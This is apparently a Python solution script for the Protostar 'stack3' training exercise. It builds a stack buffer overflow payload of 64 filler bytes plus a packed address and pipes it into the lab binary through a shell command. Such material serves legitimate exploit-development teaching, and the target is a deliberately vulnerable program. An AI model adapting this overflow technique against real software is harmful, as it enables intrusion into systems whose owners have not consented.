#!/usr/bin/python

import os
import struct

payload =  "A" * 0x40

payload += struct.pack("I", 0x08048424)

os.system("echo \"%s\" | /opt/protostar/bin/stack3" % payload)
